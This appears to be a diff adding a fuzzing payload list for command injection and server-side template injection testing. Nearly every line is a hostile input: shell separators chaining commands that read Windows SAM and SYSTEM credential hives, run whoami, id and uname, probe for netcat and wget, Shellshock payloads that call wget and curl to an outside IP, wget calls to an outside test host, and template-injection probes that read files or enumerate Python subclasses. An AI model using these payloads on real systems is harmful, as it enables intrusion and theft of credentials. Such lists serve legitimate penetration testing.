@@ -1,0 +1,95 @@
+test* | perl -e 'print "X"x16096'
+test* & perl -e 'print "X"x16096'
+test* && perl -e 'print "X"x16096'
+test*; perl -e 'print "X"x16096'
+$(`type C:\boot.ini`)
+&&type C:\\boot.ini
+| type C:\Windows\repair\SAM
+; type C:\Windows\repair\SAM
+& type C:\Windows\repair\SAM
+&& type C:\Windows\repair\SAM
+type C:\Windows\repair\SAM
+| type C:\Windows\repair\SYSTEM
+; type C:\Windows\repair\SYSTEM
+& type C:\Windows\repair\SYSTEM
+&& type C:\Windows\repair\SYSTEM
+type C:\Windows\repair\SYSTEM
+| type C:\WINNT\repair\SAM
+; type C:\WINNT\repair\SAM
+& type C:\WINNT\repair\SAM
+&& type C:\WINNT\repair\SAM
+type C:\WINNT\repair\SAM
+type C:\WINNT\repair\SYSTEM
+| type %SYSTEMROOT%\repair\SAM
+; type %SYSTEMROOT%\repair\SAM
+& type %SYSTEMROOT%\repair\SAM
+&& type %SYSTEMROOT%\repair\SAM
+type %SYSTEMROOT%\repair\SAM
+| type %SYSTEMROOT%\repair\SYSTEM
+; type %SYSTEMROOT%\repair\SYSTEM
+& type %SYSTEMROOT%\repair\SYSTEM
+&& type %SYSTEMROOT%\repair\SYSTEM
+type %SYSTEMROOT%\repair\SYSTEM
+uname
+;uname;
+| uname -a
+; uname -a
+& uname -a
+&& uname -a
+uname -a
+|/usr/bin/id
+;|/usr/bin/id|
+;/usr/bin/id|
+$;/usr/bin/id
+() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\");'
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11
+| wget http://crowdshield.com/.testing/rce.txt
+& wget http://crowdshield.com/.testing/rce.txt
+; wget https://crowdshield.com/.testing/rce_vuln.txt
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)
+&& wget https://crowdshield.com/.testing/rce_vuln.txt
+wget https://crowdshield.com/.testing/rce_vuln.txt
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+which curl
+which gcc
+which nc
+which netcat
+which perl
+which python
+which wget
+whoami
+| whoami
+; whoami
+' whoami
+' || whoami
+' & whoami
+' && whoami
+'; whoami
+" whoami
+" || whoami
+" | whoami
+" & whoami
+" && whoami
+"; whoami
+$(`whoami`)
+& whoami
+&& whoami
+{{ get_user_file("C:\boot.ini") }}
+{{ get_user_file("/etc/hosts") }}
+{{4+4}}
+{{4+8}}
+{{person.secret}}
+{{person.name}}
+{1} + {1}
+{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
+
+
+
+
+
+
+
+/ %0a%0d   %26 :unknow error
+done fuzz chanel
+exec invalid payload
